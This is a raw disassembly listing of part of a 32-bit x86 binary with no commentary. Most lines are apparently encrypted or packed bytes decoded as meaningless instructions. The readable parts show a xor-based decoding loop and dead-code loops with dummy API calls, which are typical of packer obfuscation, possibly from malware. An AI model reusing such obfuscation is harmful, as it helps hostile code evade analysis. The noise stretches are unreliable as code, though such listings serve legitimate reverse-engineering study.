  41b058:	aas    
  41b059:	imul   DWORD PTR [eax-0x14]
  41b05c:	gs jno 0x41b05d
  41b05f:	es hlt 
  41b061:	mov    bl,BYTE PTR [edi+eiz*8]
  41b064:	les    esp,FWORD PTR [eax]
  41b066:	inc    eax
  41b067:	retf   0x4117
  41b06a:	cmp    DWORD PTR [ebx+eiz*8],edi
  41b06d:	dec    ebx
  41b06e:	nop
  41b06f:	sti    
  41b070:	(bad)  
  41b071:	int    0x5b
  41b073:	loope  0x41b01a
  41b075:	stos   BYTE PTR es:[edi],al
  41b076:	and    bh,BYTE PTR [ebx-0x15633993]
  41b07c:	adc    eax,0x55085a4e
  41b081:	pop    ds
  41b082:	and    DWORD PTR [ecx-0x13bb5ef6],0xd0bf4ccb
  41b08c:	sbb    eax,0x18cefa51
  41b091:	and    DWORD PTR [ebx-0x18],esi
  41b094:	mov    ecx,ebx
  41b096:	inc    edi
  41b097:	in     eax,dx
  41b098:	jne    0x41b05f
  41b09a:	mov    edx,0xf57a4ca0
  41b09f:	sub    esi,DWORD PTR [edi+0x368d2026]
  41b0a5:	push   es
  41b0a6:	push   ebx
  41b0a7:	xchg   edx,eax
  41b0a8:	mov    WORD PTR [edx-0x63b8d56a],es
  41b0ae:	dec    edx
  41b0af:	jbe    0x41b084
  41b0b1:	les    esi,FWORD PTR [ecx+0x3c]
  41b0b4:	push   eax
  41b0b5:	sub    ah,BYTE PTR [esi-0x18]
  41b0b8:	out    dx,eax
  41b0b9:	lods   eax,DWORD PTR ds:[esi]
  41b0ba:	stos   BYTE PTR es:[edi],al
  41b0bb:	leave  
  41b0bc:	data16 gs loop 0x41b0f2
  41b0c0:	ins    BYTE PTR es:[edi],dx
  41b0c1:	das    
  41b0c2:	test   DWORD PTR [edx-0x55],edi
  41b0c5:	jg     0x41b0df
  41b0c7:	sar    BYTE PTR [ecx-0x4f9239bd],1
  41b0cd:	arpl   WORD PTR [edi],sp
  41b0cf:	mov    al,ds:0x8585e5f1
  41b0d4:	fbld   TBYTE PTR [esp+eax*4-0x516e83c6]
  41b0db:	jno    0x41b121
  41b0dd:	clc    
  41b0de:	mov    al,ds:0x5d3c0462
  41b0e3:	inc    eax
  41b0e4:	sub    bl,BYTE PTR [ebx-0x54]
  41b0e7:	mov    BYTE PTR [edx+edx*2],bl
  41b0ea:	mov    cs,WORD PTR [eax]
  41b0ec:	mov    dh,0xea
  41b0ee:	add    ebx,DWORD PTR [ebp+0x27]
  41b0f1:	xchg   esi,eax
  41b0f2:	and    eax,DWORD PTR ds:0xb46d4f57
  41b0f8:	and    edi,ebp
  41b0fa:	inc    edx
  41b0fb:	les    edx,FWORD PTR [ecx+0x1587da1a]
  41b101:	jg     0x41b14f
  41b103:	adc    al,0x7f
  41b105:	mov    ch,0x8e
  41b107:	(bad)  
  41b108:	jmp    0x69df153f
  41b10d:	ret    
  41b10e:	and    BYTE PTR [edi+eax*4+0x13],bh
  41b112:	dec    ecx
  41b113:	xor    ecx,DWORD PTR [esi]
  41b115:	and    ch,ah
  41b117:	sub    al,dl
  41b119:	add    edx,DWORD PTR [ebx-0x201ab0e1]
  41b11f:	div    bh
  41b121:	jb     0x41b17a
  41b123:	jecxz  0x41b0a5
  41b125:	out    0xa3,al
  41b127:	jge    0x41b134
  41b129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b12a:	mov    bl,0xee
  41b12c:	mov    esp,0xe2ddbf00
  41b131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b132:	pop    esi
  41b133:	pop    ss
  41b134:	mov    ah,0x9a
  41b136:	adc    DWORD PTR [ebx-0x6c],esi
  41b139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b13a:	stos   BYTE PTR es:[edi],al
  41b13b:	test   eax,0xacec5f39
  41b140:	js     0x41b191
  41b142:	loopne 0x41b163
  41b144:	bound  ebp,QWORD PTR [eax]
  41b146:	push   ss
  41b147:	outs   dx,DWORD PTR gs:[esi]
  41b149:	add    eax,0x1e42d4a2
  41b14e:	jns    0x41b19d
  41b150:	shl    DWORD PTR [edx+edi*2+0x1e],1
  41b154:	stos   DWORD PTR es:[edi],eax
  41b155:	inc    ebp
  41b156:	push   ss
  41b157:	mov    ebx,0x1f48a316
  41b15c:	cs pop ebp
  41b15e:	push   edi
  41b15f:	shr    DWORD PTR [ecx+0x168e03a4],cl
  41b165:	push   0xffffffaf
  41b167:	(bad)  
  41b168:	sub    BYTE PTR [edi],dh
  41b16a:	fwait
  41b16b:	or     edx,DWORD PTR [esi]
  41b16d:	hlt    
  41b16e:	mov    ecx,0x7546a177
  41b173:	call   0x428b:0xa9dfe426
  41b17a:	sbb    al,0x7b
  41b17c:	call   0x20555e37
  41b181:	ret    
  41b182:	mov    DWORD PTR [ebp+0x7995e218],edx
  41b188:	pop    esp
  41b189:	retf   
  41b18a:	mov    dh,0xea
  41b18c:	cmp    ebp,0xffffff8f
  41b18f:	mov    esi,0x9f731804
  41b194:	mov    dh,0x1d
  41b196:	outs   dx,BYTE PTR ds:[esi]
  41b197:	cwde   
  41b198:	mov    edi,0xd13b711e
  41b19d:	call   FWORD PTR [edi+0x4f]
  41b1a0:	int    0x7d
  41b1a2:	add    ecx,eax
  41b1a4:	int    0x7d
  41b1a6:	adc    al,0x89
  41b1a8:	jl     0x41b1e8
  41b1aa:	bound  edi,QWORD PTR [edi]
  41b1ac:	fwait
  41b1ad:	push   edi
  41b1ae:	push   ebx
  41b1af:	pusha  
  41b1b0:	ss cmp eax,0x50504f9f
  41b1b6:	mov    ebp,DWORD PTR [eax+0x20ef07e2]
  41b1bc:	fwait
  41b1bd:	adc    DWORD PTR [ecx-0x40a90c2b],esp
  41b1c3:	adc    eax,DWORD PTR [esi+ecx*4-0x1a]
  41b1c7:	into   
  41b1c8:	cmp    BYTE PTR [edx+0x72b6df1a],dl
  41b1ce:	jecxz  0x41b1d1
  41b1d0:	imul   esi,DWORD PTR [eax],0x5b686e2a
  41b1d6:	xor    dh,dh
  41b1d8:	test   BYTE PTR ds:[esp+ecx*8+0x14],0xb2
  41b1de:	mov    al,0xe0
  41b1e0:	ror    BYTE PTR [edi],1
  41b1e2:	loop   0x41b25e
  41b1e4:	out    0xda,eax
  41b1e6:	sti    
  41b1e7:	xlat   BYTE PTR ds:[ebx]
  41b1e8:	retf   
  41b1e9:	and    DWORD PTR [eax-0x524f91a0],ebp
  41b1ef:	or     edi,DWORD PTR [ebp+0x6d]
  41b1f2:	shl    BYTE PTR [ebx+0x1b],0xf8
  41b1f6:	(bad)  
  41b1f7:	retf   0x7986
  41b1fa:	gs adc eax,esi
  41b1fd:	loop   0x41b27a
  41b1ff:	xchg   bh,bh
  41b201:	sbb    DWORD PTR [ebp+0x72],ebx
  41b204:	jb     0x41b20b
  41b206:	adc    al,0x6e
  41b208:	bound  esi,QWORD PTR [ebx]
  41b20a:	sar    BYTE PTR [esi+0x302abc35],0xee
  41b211:	call   0x7c5c:0xe75aeb2a
  41b218:	test   BYTE PTR [eax],0x59
  41b21b:	popa   
  41b21c:	jnp    0x41b1f4
  41b21e:	pop    ds
  41b21f:	in     al,dx
  41b220:	pop    edi
  41b221:	jae    0x41b1bb
  41b223:	xchg   ebp,eax
  41b224:	(bad)  
  41b225:	push   cs
  41b226:	adc    dl,BYTE PTR [ecx]
  41b228:	jns    0x41b27c
  41b22a:	leave  
  41b22b:	jnp    0x41b257
  41b22d:	test   DWORD PTR [eax],esi
  41b22f:	sbb    esp,DWORD PTR [edi*1-0x70f89304]
  41b236:	fidivr DWORD PTR [ecx-0x35]
  41b239:	repz lahf 
  41b23b:	retf   
  41b23c:	mov    esi,0x16255a11
  41b241:	add    BYTE PTR [esi],cl
  41b243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b244:	leave  
  41b245:	pop    ebx
  41b246:	inc    ecx
  41b247:	aad    0x46
  41b249:	and    BYTE PTR [esi],bl
  41b24b:	cli    
  41b24c:	xlat   BYTE PTR ds:[ebx]
  41b24d:	fistp  DWORD PTR [ebx+0x370b4f51]
  41b253:	jge    0x41b1da
  41b255:	xor    DWORD PTR [ebp-0x25],eax
  41b258:	cmp    esi,DWORD PTR [edi-0x7398b675]
  41b25e:	in     al,0x75
  41b260:	inc    edi
  41b261:	retf   0xee12
  41b264:	shl    DWORD PTR [esi+0x6f],1
  41b267:	(bad)
  41b26a:	pop    ecx
  41b26b:	int3   
  41b26c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b26d:	pop    eax
  41b26e:	add    ecx,ebx
  41b270:	nop
  41b271:	sbb    DWORD PTR [ebp-0x32],esp
  41b274:	not    ah
  41b276:	sti    
  41b277:	jne    0x41b26d
  41b279:	mov    eax,0xca744b3f
  41b27e:	or     BYTE PTR [esi+0x489042a0],cl
  41b284:	or     al,0xb9
  41b286:	test   eax,0x52b3c523
  41b28b:	xchg   DWORD PTR [esi],esi
  41b28d:	inc    esi
  41b28e:	jmp    0x3f7b79c6
  41b293:	call   0x41a4:0x60bb2b96
  41b29a:	jb     0x41b2be
  41b29c:	cmp    DWORD PTR ds:0x8ac3d04b,ebp
  41b2a2:	mov    cl,bl
  41b2a4:	sbb    DWORD PTR [eax],ecx
  41b2a6:	data16 adc al,0xee
  41b2a9:	sub    ecx,DWORD PTR [edx-0x24]
  41b2ac:	adc    al,0x74
  41b2ae:	test   edi,eax
  41b2b0:	and    DWORD PTR [ebx-0x817f048],esi
  41b2b6:	lahf   
  41b2b7:	sbb    BYTE PTR [eax],al
  41b2b9:	xchg   ebx,eax
  41b2ba:	add    esp,0x951480c6
  41b2c0:	fiadd  DWORD PTR [ecx+0xe]
  41b2c3:	push   0x63
  41b2c5:	xor    al,BYTE PTR [esp+edx*1]
  41b2c8:	inc    esp
  41b2c9:	push   0x13c28d9
  41b2ce:	(bad)  [ebx-0x7d]
  41b2d1:	in     eax,0xbc
  41b2d3:	cmp    dl,BYTE PTR [ebx+0x4fc2fd62]
  41b2d9:	adc    ebx,DWORD PTR [esi]
  41b2db:	adc    BYTE PTR [eax-0x51d284e4],ch
  41b2e1:	add    bh,dl
  41b2e3:	in     al,0xc
  41b2e5:	ror    BYTE PTR [eax-0x5],cl
  41b2e8:	aas    
  41b2e9:	ss das 
  41b2eb:	cwde   
  41b2ec:	push   ebp
  41b2ed:	sbb    BYTE PTR [esi-0x53],al
  41b2f0:	and    BYTE PTR [ecx-0x67660dab],ah
  41b2f6:	shr    BYTE PTR [eax+0x30],cl
  41b2f9:	and    al,0xa3
  41b2fb:	jecxz  0x41b28d
  41b2fd:	(bad)  
  41b2fe:	cwde   
  41b2ff:	pusha  
  41b300:	ja     0x41b2b7
  41b302:	mov    ss,esp
  41b304:	mov    ebx,0xa4569342
  41b309:	cld    
  41b30a:	mov    bl,0xff
  41b30c:	call   0xd444:0x9f3ff9d8
  41b313:	cld    
  41b314:	sbb    esp,DWORD PTR [ecx]
  41b316:	ficomp WORD PTR [esi+0x15]
  41b319:	dec    ebp
  41b31a:	ret    0x3002
  41b31d:	cli    
  41b31e:	ret    
  41b31f:	jl     0x41b33a
  41b321:	leave  
  41b322:	add    eax,DWORD PTR [ebp+esi*8+0x21127250]
  41b329:	mov    eax,ds:0x8960e27b
  41b32e:	xor    al,0x42
  41b330:	pop    ebx
  41b331:	rcr    DWORD PTR [edi+0x6c],1
  41b334:	push   0xcce7a9bc
  41b339:	xchg   BYTE PTR [ecx],bl
  41b33b:	loop   0x41b30d
  41b33d:	mov    al,0xb4
  41b33f:	loope  0x41b2e9
  41b341:	imul   eax,DWORD PTR [esi-0x29],0xffffff86
  41b345:	aas    
  41b346:	mov    bh,0x26
  41b348:	mov    dl,0xc0
  41b34a:	lahf   
  41b34b:	mov    dl,BYTE PTR [eax-0x5]
  41b34e:	mov    ebp,0x169dc42b
  41b353:	sahf   
  41b354:	hlt    
  41b355:	jmp    0x25bd:0x3e61d14c
  41b35c:	xchg   BYTE PTR [eax],dl
  41b35e:	arpl   WORD PTR ds:0x68368289,dx
  41b364:	retf   
  41b365:	jno    0x41b2f5
  41b367:	mov    ebx,0x2fadea4c
  41b36c:	jmp    0x41b3bb
  41b36e:	cs xor ebx,edi
  41b371:	imul   ebp,DWORD PTR [edi-0x60],0xbcc2739c
  41b378:	ret    
  41b379:	in     al,0x3b
  41b37b:	stc    
  41b37c:	popa   
  41b37d:	cdq    
  41b37e:	cmp    eax,0xf979d54c
  41b383:	adc    BYTE PTR [eax],ah
  41b385:	lods   eax,DWORD PTR ds:[esi]
  41b386:	and    ecx,DWORD PTR [esp+ebp*1]
  41b389:	lods   al,BYTE PTR ds:[esi]
  41b38a:	mov    al,0xa6
  41b38c:	bound  ebx,QWORD PTR [ecx+0x574046b5]
  41b392:	stc    
  41b393:	or     DWORD PTR [eax-0x47f1decd],esi
  41b399:	add    al,0xb2
  41b39b:	xchg   esi,eax
  41b39c:	push   eax
  41b39d:	arpl   WORD PTR [ebp+0x5ab776e6],ax
  41b3a3:	and    al,0x52
  41b3a5:	pop    ebx
  41b3a6:	cmp    eax,0x3805e530
  41b3ab:	or     al,0xd1
  41b3ad:	adc    eax,0xbeac0269
  41b3b2:	aad    0x4f
  41b3b4:	pop    es
  41b3b5:	and    eax,0x778bc009
  41b3ba:	xor    cl,BYTE PTR [ebp+0x1f6087ff]
  41b3c0:	sbb    BYTE PTR [esi+ebx*8+0x5f8c411a],0x6d
  41b3c8:	ins    DWORD PTR es:[edi],dx
  41b3c9:	(bad)  
  41b3ca:	fild   DWORD PTR [ebp+0x4159054b]
  41b3d0:	mov    edi,0x5d506900
  41b3d5:	and    al,0x82
  41b3d7:	sbb    edi,esi
  41b3d9:	push   ds
  41b3da:	fsub   DWORD PTR [ecx]
  41b3dc:	adc    BYTE PTR [ecx-0x53],0x5a
  41b3e0:	ror    al,cl
  41b3e2:	clc    
  41b3e3:	or     ebp,0x12145c42
  41b3e9:	stc    
  41b3ea:	gs call 0x214cb430
  41b3f0:	out    0xc5,al
  41b3f2:	jg     0x41b457
  41b3f4:	test   eax,0x7f7561a1
  41b3f9:	pop    ebx
  41b3fa:	or     cl,BYTE PTR [ebp+ecx*8+0x310c696c]
  41b401:	jmp    DWORD PTR ds:0xb101d580
  41b407:	inc    eax
  41b408:	push   esp
  41b409:	out    dx,eax
  41b40a:	loop   0x41b42e
  41b40c:	adc    ch,BYTE PTR [ebp+0x34]
  41b40f:	xchg   BYTE PTR [esp+0x32],dl
  41b413:	cld    
  41b414:	mov    ah,0xd3
  41b416:	hlt    
  41b417:	and    al,0xa3
  41b419:	mov    dh,0x76
  41b41b:	mov    ds:0x40c3257d,eax
  41b420:	ins    BYTE PTR es:[edi],dx
  41b421:	add    ch,BYTE PTR [eax-0x46ce15bd]
  41b427:	mov    DWORD PTR ds:0xe58cda24,edx
  41b42d:	les    ecx,FWORD PTR [ecx]
  41b42f:	adc    DWORD PTR [eax],ecx
  41b431:	jno    0x41b40d
  41b433:	mov    al,ds:0xc23bd4a0
  41b438:	sbb    eax,0x82f69fcb
  41b43d:	or     BYTE PTR [eax],dl
  41b43f:	scas   eax,DWORD PTR es:[edi]
  41b440:	sub    esp,ebx
  41b442:	out    dx,eax
  41b443:	in     eax,0x16
  41b445:	or     BYTE PTR [ebp-0x6e],0x3a
  41b449:	mov    ebp,DWORD PTR [edi-0x66]
  41b44c:	mov    ecx,DWORD PTR [esi-0x491e02d4]
  41b452:	dec    BYTE PTR [esi+edx*1+0x38417dc1]
  41b459:	dec    esp
  41b45a:	int    0x40
  41b45c:	xchg   edi,eax
  41b45d:	lods   eax,DWORD PTR ds:[esi]
  41b45e:	mov    bh,0xe1
  41b460:	dec    edi
  41b461:	ins    DWORD PTR es:[edi],dx
  41b462:	add    bh,0xf9
  41b465:	mov    eax,0xa8f20962
  41b46a:	div    DWORD PTR [ebx]
  41b46c:	ins    DWORD PTR es:[edi],dx
  41b46d:	(bad)
  41b470:	jecxz  0x41b497
  41b472:	lods   eax,DWORD PTR ds:[esi]
  41b473:	push   ecx
  41b474:	dec    ebp
  41b475:	or     eax,0xffb88e03
  41b47a:	ins    DWORD PTR es:[edi],dx
  41b47b:	and    BYTE PTR [edi],dl
  41b47d:	push   edx
  41b47e:	scas   al,BYTE PTR es:[edi]
  41b47f:	push   esp
  41b480:	sbb    cl,dh
  41b482:	leave  
  41b483:	push   ebp
  41b484:	imul   ebx,DWORD PTR [eax],0xfffffff6
  41b487:	adc    ah,bh
  41b489:	add    eax,0xcc22ab27
  41b48e:	push   esi
  41b48f:	inc    esi
  41b490:	ror    BYTE PTR [edi],cl
  41b492:	pop    ss
  41b493:	pop    ebp
  41b494:	pop    ebx
  41b495:	mov    WORD PTR [esi],ds
  41b497:	daa    
  41b498:	push   es
  41b499:	popf   
  41b49a:	bound  esi,QWORD PTR [edx+0x70]
  41b49d:	sub    dh,ah
  41b49f:	push   es
  41b4a0:	out    0x70,al
  41b4a2:	and    BYTE PTR [esi],bl
  41b4a4:	outs   dx,BYTE PTR ds:[esi]
  41b4a5:	cmp    BYTE PTR [ecx+0x1e7a7df8],dh
  41b4ab:	mov    bl,0x42
  41b4ad:	sub    BYTE PTR [ebp+0x2],bh
  41b4b0:	or     eax,0xcc8b490d
  41b4b5:	cld    
  41b4b6:	xchg   ebp,eax
  41b4b7:	push   ds
  41b4b8:	pop    ss
  41b4b9:	bound  ebp,QWORD PTR [edi]
  41b4bb:	ds iret 
  41b4bd:	fcomip st,st(5)
  41b4bf:	ret    0xd052
  41b4c2:	sub    bl,dl
  41b4c4:	push   ebx
  41b4c5:	xor    bh,BYTE PTR [esi-0x61]
  41b4c8:	xor    DWORD PTR [edx+0xf],ebp
  41b4cb:	push   ss
  41b4cc:	jmp    0xcecd:0xe00d46f1
  41b4d3:	js     0x41b4ac
  41b4d5:	cmp    BYTE PTR [ecx-0x57],ah
  41b4d8:	inc    esi
  41b4d9:	in     al,0x4f
  41b4db:	pop    es
  41b4dc:	jp     0x41b46c
  41b4de:	mov    al,ds:0x1c894c17
  41b4e3:	fld    QWORD PTR [edx]
  41b4e5:	xchg   edx,eax
  41b4e6:	into   
  41b4e7:	scas   al,BYTE PTR es:[edi]
  41b4e8:	pop    ss
  41b4e9:	stos   BYTE PTR es:[edi],al
  41b4ea:	jmp    0x41b500
  41b4ec:	bound  ebp,QWORD PTR [edi+ebp*2]
  41b4ef:	icebp  
  41b4f0:	inc    esi
  41b4f1:	xor    BYTE PTR [esi+0x3a030310],0x46
  41b4f8:	inc    edi
  41b4f9:	push   es
  41b4fa:	jmp    0x41b539
  41b4fc:	or     BYTE PTR [eax+eiz*4+0x67],ah
  41b500:	fs mov ebx,0xda093294
  41b506:	fdivr  QWORD PTR [ebx+0x6dff7a83]
  41b50c:	int3   
  41b50d:	dec    ebp
  41b50e:	jne    0x41b574
  41b510:	ins    BYTE PTR es:[edi],dx
  41b511:	jecxz  0x41b54b
  41b513:	jmp    0xfd3a:0x440bee2d
  41b51a:	hlt    
  41b51b:	cs push cs
  41b51d:	dec    esp
  41b51e:	sub    eax,0x31b4bb4c
  41b523:	retf   
  41b524:	cld    
  41b525:	adc    ecx,ecx
  41b527:	sbb    ah,BYTE PTR [eax]
  41b529:	(bad)  
  41b52c:	pop    ebp
  41b52d:	in     al,0x71
  41b52f:	mov    WORD PTR [edi+0x1],gs
  41b532:	dec    eax
  41b533:	sahf   
  41b534:	inc    edx
  41b535:	add    bl,BYTE PTR [ebp-0x283d4507]
  41b53b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b53c:	push   0xb1d11a83
  41b541:	cdq    
  41b542:	pop    esi
  41b543:	jnp    0x41b4cf
  41b545:	or     al,0xac
  41b547:	shr    DWORD PTR [ecx],cl
  41b549:	jno    0x41b546
  41b54b:	mov    cl,0x37
  41b54d:	shl    DWORD PTR [edi],0x20
  41b550:	add    ah,bh
  41b552:	mov    bl,0x5
  41b554:	retf   0x4d8b
  41b557:	or     BYTE PTR [ebx-0x30fc4bab],cl
  41b55d:	and    ecx,edx
  41b55f:	mov    DWORD PTR [ebp-0x4c],ecx
  41b562:	mov    ecx,DWORD PTR [ebp+0x8]
  41b565:	mov    edx,DWORD PTR [ebp-0x48]
  41b568:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b56f:	mov    DWORD PTR [ebp-0x48],ecx
  41b572:	mov    ecx,DWORD PTR [ebp+0x8]
  41b575:	mov    edx,0xfa5e1524
  41b57a:	sub    edx,ecx
  41b57c:	add    edx,DWORD PTR [ebp-0x44]
  41b57f:	mov    DWORD PTR [ebp-0x44],edx
  41b582:	mov    ecx,DWORD PTR [ebp+0x8]
  41b585:	xor    ecx,eax
  41b587:	add    ecx,esi
  41b589:	jne    0x4191ae
  41b58f:	jmp    0x41b621
  41b594:	mov    ecx,DWORD PTR [ebp+0x8]
  41b597:	mov    edx,DWORD PTR [ebp-0x8]
  41b59a:	xor    ecx,eax
  41b59c:	xor    edx,eax
  41b59e:	sub    ecx,edx
  41b5a0:	sub    ecx,esi
  41b5a2:	xor    ecx,eax
  41b5a4:	mov    DWORD PTR [ebp+0x8],ecx
  41b5a7:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5aa:	mov    edx,DWORD PTR [ebp-0x58]
  41b5ad:	add    ecx,0x5708e2
  41b5b3:	imul   ecx,edx
  41b5b6:	mov    DWORD PTR [ebp-0x58],ecx
  41b5b9:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x54]
  41b5bf:	add    ecx,0x64f880
  41b5c5:	or     ecx,edx
  41b5c7:	mov    DWORD PTR [ebp-0x54],ecx
  41b5ca:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5cd:	mov    edx,DWORD PTR [ebp-0x50]
  41b5d0:	add    ecx,0x242ebf1
  41b5d6:	xor    ecx,edx
  41b5d8:	mov    DWORD PTR [ebp-0x50],ecx
  41b5db:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5de:	mov    edx,DWORD PTR [ebp-0x4c]
  41b5e1:	add    ecx,edi
  41b5e3:	and    ecx,edx
  41b5e5:	mov    DWORD PTR [ebp-0x4c],ecx
  41b5e8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5eb:	mov    edx,DWORD PTR [ebp-0x48]
  41b5ee:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b5f5:	mov    DWORD PTR [ebp-0x48],ecx
  41b5f8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5fb:	mov    edx,0xfa5e1524
  41b600:	sub    edx,ecx
  41b602:	add    edx,DWORD PTR [ebp-0x44]
  41b605:	mov    DWORD PTR [ebp-0x44],edx
  41b608:	mov    ecx,DWORD PTR [ebp+0x8]
  41b60b:	xor    ecx,eax
  41b60d:	add    ecx,esi
  41b60f:	jne    0x41b594
  41b615:	mov    ecx,DWORD PTR [ebp-0x8]
  41b618:	xor    ecx,eax
  41b61a:	mov    eax,DWORD PTR [ebp+0x10]
  41b61d:	add    ecx,esi
  41b61f:	mov    DWORD PTR [eax],ecx
  41b621:	pop    edi
  41b622:	pop    esi
  41b623:	pop    ebx
  41b624:	leave  
  41b625:	ret    0xc
  41b628:	push   ebp
  41b629:	mov    ebp,esp
  41b62b:	sub    esp,0x78
  41b62e:	push   esi
  41b62f:	mov    DWORD PTR ds:0x42b21e,0x12
  41b639:	cmp    DWORD PTR ds:0x42b21e,0x0
  41b640:	je     0x41b684
  41b646:	cmp    DWORD PTR ds:0x42b21e,0x16
  41b64d:	jle    0x41b684
  41b653:	jmp    0x41b672
  41b658:	push   0x42b1fa
  41b65d:	push   0x8597
  41b662:	push   0x42a285
  41b667:	push   0x42a1b7
  41b66c:	call   DWORD PTR ds:0x42b31e
  41b672:	mov    esi,DWORD PTR ds:0x42b21e
  41b678:	dec    esi
  41b679:	mov    DWORD PTR ds:0x42b21e,esi
  41b67f:	jmp    0x41b639
  41b684:	push   edi
  41b685:	sub    DWORD PTR ds:0x42b1ca,0x4941
  41b68f:	mov    eax,ds:0x42a472
  41b694:	xor    esi,esi
  41b696:	xor    esi,DWORD PTR ds:0x42b1d6
  41b69c:	add    esi,DWORD PTR ds:0x42b1da
  41b6a2:	mov    DWORD PTR ds:0x42b1d6,esi
  41b6a8:	mov    DWORD PTR [ebp-0x24],eax
  41b6ab:	and    DWORD PTR ds:0x42b226,edx
  41b6b1:	mov    eax,ds:0x42a592
  41b6b6:	mov    ecx,DWORD PTR ds:0x42b256
  41b6bc:	mov    ecx,DWORD PTR [ecx]
  41b6be:	xor    DWORD PTR ds:0x42b1f2,ecx
  41b6c4:	mov    DWORD PTR [ebp-0x30],eax
  41b6c7:	mov    DWORD PTR ds:0x42b1b2,0x10
  41b6d1:	cmp    DWORD PTR ds:0x42b1b2,0x0
  41b6d8:	je     0x41b70e
  41b6de:	cmp    DWORD PTR ds:0x42b1b2,0x1e
  41b6e5:	ja     0x41b70e
  41b6eb:	jmp    0x41b6fb
  41b6f0:	push   0x25ea
  41b6f5:	call   DWORD PTR ds:0x42b322
  41b6fb:	xor    eax,eax
  41b6fd:	xor    eax,DWORD PTR ds:0x42b1b2
  41b703:	dec    eax
  41b704:	mov    ds:0x42b1b2,eax
  41b709:	jmp    0x41b6d1
  41b70e:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  41b715:	and    DWORD PTR ds:0x42b21e,0x0
  41b71f:	jmp    0x41b733
  41b724:	xor    esi,esi
  41b726:	add    esi,DWORD PTR ds:0x42b21e
  41b72c:	inc    esi
  41b72d:	mov    DWORD PTR ds:0x42b21e,esi
  41b733:	cmp    DWORD PTR ds:0x42b21e,0x14
  41b73a:	jae    0x41b77c
  41b740:	cmp    DWORD PTR ds:0x42b21e,0x7
  41b747:	jl     0x41b77c
  41b74d:	jmp    0x41b75d
  41b752:	push   0x3b69
  41b757:	call   DWORD PTR ds:0x42b326
  41b75d:	cmp    DWORD PTR ds:0x42b21e,0x6
  41b764:	jne    0x41b777
  41b76a:	mov    esi,DWORD PTR ds:0x42b21e
  41b770:	inc    esi
  41b771:	mov    DWORD PTR ds:0x42b21e,esi
  41b777:	jmp    0x41b724
  41b77c:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  41b783:	or     eax,DWORD PTR ds:0x42b212
  41b789:	mov    eax,DWORD PTR [ebp-0x10]
  41b78c:	and    DWORD PTR ds:0x42b1c2,0x0
  41b796:	jmp    0x41b7aa
  41b79b:	xor    ecx,ecx
  41b79d:	or     ecx,DWORD PTR ds:0x42b1c2
  41b7a3:	inc    ecx
  41b7a4:	mov    DWORD PTR ds:0x42b1c2,ecx
  41b7aa:	cmp    DWORD PTR ds:0x42b1c2,0x16
  41b7b1:	jae    0x41b7ee
  41b7b7:	cmp    DWORD PTR ds:0x42b1c2,0x22
  41b7be:	jb     0x41b7ee
  41b7c4:	jmp    0x41b7e9
  41b7c9:	push   0x42a121
  41b7ce:	push   0x73a7
  41b7d3:	push   DWORD PTR [ebp-0x18]
  41b7d6:	push   0x5cd1
  41b7db:	push   0x2368
  41b7e0:	push   DWORD PTR [ebp-0xc]
  41b7e3:	call   DWORD PTR ds:0x42b2ea
  41b7e9:	jmp    0x41b79b
  41b7ee:	mov    ecx,DWORD PTR [ebp-0x10]
  41b7f1:	mov    DWORD PTR ds:0x42b1be,0x10
  41b7fb:	cmp    DWORD PTR ds:0x42b1be,0x0
  41b802:	je     0x41b85b
  41b808:	cmp    DWORD PTR ds:0x42b1be,0x9
  41b80f:	jle    0x41b85b
  41b815:	jmp    0x41b82f
  41b81a:	push   0x42a03d
  41b81f:	push   0x0
  41b821:	push   DWORD PTR [ebp-0xc]
  41b824:	push   0x5431
  41b829:	call   DWORD PTR ds:0x42b2ee
  41b82f:	cmp    DWORD PTR ds:0x42b1be,0xa
  41b836:	jne    0x41b849
  41b83c:	mov    edi,DWORD PTR ds:0x42b1be
  41b842:	dec    edi
  41b843:	mov    DWORD PTR ds:0x42b1be,edi
  41b849:	mov    edi,DWORD PTR ds:0x42b1be
  41b84f:	dec    edi
  41b850:	mov    DWORD PTR ds:0x42b1be,edi
  41b856:	jmp    0x41b7fb
  41b85b:	sub    eax,ecx
  41b85d:	and    esi,esi
  41b85f:	jmp    0x41dbf0
  41b864:	xchg   ch,bl
  41b866:	fdiv   st,st(3)
  41b868:	test   dl,ah
  41b86a:	xchg   BYTE PTR [edx+0x1c89e04a],dl
  41b870:	xor    al,0xe9
  41b872:	fwait
  41b873:	dec    esp
  41b874:	out    dx,al
  41b875:	inc    DWORD PTR [eax-0x7ca1f07d]
  41b87b:	add    DWORD PTR [ebx+0x0],0x1c
  41b87f:	je     0x41b840
  41b881:	cmp    eax,0xd9972e19
  41b886:	add    bl,BYTE PTR [esp+ebx*4-0x5d]
  41b88a:	dec    ebx
  41b88b:	add    edi,DWORD PTR [edx+0x1ef8e1af]
  41b891:	call   0x1b73:0x3ecd7700
  41b898:	jle    0x41b870
  41b89a:	ficomp WORD PTR [edx-0x16145351]
  41b8a0:	mov    DWORD PTR [ecx],esi
  41b8a2:	fist   DWORD PTR [edi-0x34]
  41b8a5:	or     al,0x22
  41b8a7:	popa   
  41b8a8:	xchg   ebx,eax
  41b8a9:	xchg   DWORD PTR [esi-0x6c70abbf],esp
  41b8af:	mov    bl,BYTE PTR [edx]
  41b8b1:	cmp    DWORD PTR [ebp-0x35f9505d],ebx
  41b8b7:	inc    esp
  41b8b8:	sbb    eax,0xb275b0b7
  41b8bd:	pushf  
  41b8be:	aas    
  41b8bf:	xchg   edi,eax
  41b8c0:	mov    dh,0x20
  41b8c2:	adc    BYTE PTR [edi+0x6f],al
  41b8c5:	dec    esi
  41b8c6:	jb     0x41b8ac
  41b8c8:	out    0x92,eax
